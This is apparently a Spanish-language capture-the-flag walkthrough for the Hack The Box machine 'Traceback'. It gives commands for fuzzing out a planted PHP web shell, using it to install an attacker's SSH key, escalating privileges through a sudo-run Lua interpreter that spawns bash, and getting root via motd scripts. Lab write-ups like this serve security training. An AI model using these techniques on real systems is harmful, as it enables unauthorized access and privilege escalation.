## Traceback
## Herramientas a Utilizar
- nmap
- wfuzz
- ssh-keygen
- chmod

```
nmap -n -A -o scan.tracerback.txt 10.10.10.181
```

Iremo a la siguiente web:
```
https://github.com/TheBinitGhimire/Web-Shells
```

Debemos descargaremos todo los nombre de shell de este site y lo pondremos en txt.

El cual llamaremos: `rsearch.txt`

Luego buscaremos coincidencia de las misma con el siguiente comando.
```
wfuzz -c -z file,'rsearch.txt' http://10.10.10.181/FUZZ
```
Encontraremos 

000000015: 200 58 L 100 W 1261 Ch `"smevk.php" `

Debemos ejecutar ahora
```
http://10.10.10.181/smevk.php
```

En este panel debemos escribir `"Change Dir"` 
nos movemos a 
```
/home/.ssh/
```
Aqui debemos crear nuestra propia llave de ssh `publica` y `privada` para conectarno

**Como generamos nuestra Llaves.**
En nuestra maquina iremos a `home` de nuestro usuario y accederemos al directorio `.ssh`

Desde aqui ejecutaremos:
```
ssh-keygen <enter>
```
[+] Enter file in which to save the key `(/home/ylo/.ssh/id_rsa):` *presionadmos enter*
Enter passphrase `(empty for no passphrase):` *Digitamos nuestra clave*
Enter same passphrase again: *Confirmamos la clave digitada*


Este proceso nos generara dos archivo:
`id_rsa` = *Llave privada*
`id_rsa.pub` = *Llave publica*

Copiamos el contenido de nuestra llave publica `id_rsa.pub` y Creamos un archivo llamado `authorized_key`.
```
cp id_rsa.pub authorized_key
```

Ahora volver al portal
```
http://10.10.10.181/smevk.php
```
Nos movemos al diretorio
```
/home/webadmin/.ssh/ 
```
Eliminaremos el archivo `authorized_key` 
Luego subimos nuestro archivo `authorized_key`

Volvemos a nuestra maquina desde donde creamos nuestra llaves publica y privada
y al archivo `id_rsa` le cambiar el permiso para poder utilizarlo.

```
chmod 444 id_rsa
```

Nos conectaremos a la maquina de la siguiente manera:

```
ssh -i id_rsa webadmin@10.10.10.181
```
Si todo va bien solo debemos poner la clave con la cual generamos la llaves.

>Una vez dentro podemos ver un archivo llamado `trace.lua` con el cual posiblemente podriamo escaleremos privilegio.
```
ls -la trace.lua
```

Continuando la enumeracion si ejecutamos 
```
ps aux
````
Notaremos que un proceso que esta ejecutando lo siguiente: `sudo -u sysadmin /home/sysadmin/luvit` entre otra cosas, pero solo tomaremos esta parte.

Ahora tenemos lo siguiente:
`sudo -u sysadmin /home/sysadmin/luvit`
El contenido del archivo trace.lua
`os.execute("/bin/bash -i")`

Por lo que si ejecutamos:
```
sudo -u sysadmin /home/sysadmin/luvit trace.lua 
whoami
sysadmin 
```
Y con esto tenemos ahora tenemos permiso de `sysadmin`

```
cd /home/sysadmin
cat user.txt
```

Ahora para conseguir la Flag del root y despues de buscar y buscar y buscar 😢  iremos a:

```
cd /etc/update-motd.d/
cat 00-header
```
Este archivo nos muestra una forma muy peculiar de ejecutar algo al momento de iniciar session ssh
```
echo "cat /root/root.txt" >> 00-header
```

Inmediatamente abriremos otra Terminal para conectarnos otra vez via ssh.
```
ssh -i id_rsa webadmin@10.10.10.181
```

Al conectarno en el Welcome del ssh debe aparecer la flag del root. 🤷‍♂️
